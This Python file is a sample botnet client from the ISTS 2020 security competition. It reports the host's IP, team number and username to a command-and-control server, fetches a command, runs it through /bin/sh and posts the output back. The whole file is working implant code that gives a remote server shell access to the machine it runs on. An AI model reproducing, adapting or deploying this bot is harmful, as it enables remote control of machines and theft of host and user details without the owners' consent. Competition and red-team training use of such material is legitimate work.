"""
A sample python client which implements the bot for testing
Original: https://github.com/ritsec/ISTS2020-Botnet/blob/master/bot.py
"""

import os
import requests
import json
import subprocess
import socket
import getpass

def jprint(data):
    string = json.dumps(data, indent=2)
    string = "\t" + string.replace("\n", "\n\t") + "\n"
    print(string)

def getLocalIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def getTeamNum(ip: str):
    #ips in ISTS 2020 are of the form 10.x.1.10, where x is team, 1 is [1,2,3]
    return ip.split(".")[1]

def istsCallback(server: str):
    ip = getLocalIP()
    team = getTeamNum(ip)

    server = "http://"+server

    print("[*] GET to {}/callback:".format(server))
    # Get the commands from the server
    data = {
        "team": team,
        "ip": ip,
        "user": getpass.getuser()
    }
    jprint(data)
    resp = requests.get(server + "/callback", json=data).json()
    print("[+] Response:")
    jprint(resp)

    if "printf" in resp['command']:
        print(resp['command'])
    if "error" in resp:
        print("[!]", resp["error"])
        quit(1)

    # Run the commands
    print("[*] Running the process...")
    try:
        proc = subprocess.Popen(
            "/bin/sh", stdin=subprocess.PIPE, stdout=subprocess.PIPE
        )
        stdout, stderr = proc.communicate(resp['command'].encode("utf-8"))
        proc.terminate()
    except Exception as E:
        print("[!] Failure:", E)
        quit(1)

    # Send the results back to the same URL but as a POST
    print("[*] POST to {}/callback:".format(server))


    data = {
        "id": resp['id'],
        "results": stdout.decode("utf-8")
    }
    jprint(data)

    resp = requests.post(server + "/callback", json=data).json()
    print("[+] Response:")
    jprint(resp)


if __name__ == "__main__":
    istsCallback("samplec2.ists")